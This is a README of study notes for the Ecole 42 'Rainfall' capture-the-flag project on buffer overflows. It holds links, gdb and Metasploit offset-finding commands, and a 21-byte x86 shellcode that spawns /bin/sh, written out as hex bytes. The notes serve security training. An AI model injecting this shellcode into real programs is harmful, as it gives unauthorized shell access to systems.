# Rainfall

## Ecole 42 - Subject

Second security project in the form of a CTF challenge. Objectives: reverse-engineering, buffer overflow and other exploits.

## notes

Change base-16 shell:

    $ echo 'ibase=16; 1A7' | bc

book:
Hacking: The Art of Exploitation
https://www.amazon.com/gp/product/1593271441/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1593271441&linkCode=as2&tag=jasonrush-20&linkId=48b27203c4d96dd852de862975219b77


exploits:
https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6

## shellcode (21 bytes)
http://shell-storm.org/shellcode/files/shellcode-575.html
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

## misc

https://beta.hackndo.com/buffer-overflow/

### https://visualgdb.com/

## gdb

set disassembly-flavor intel

## metasploit

we create patter to find the offset with metasploit:

    $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq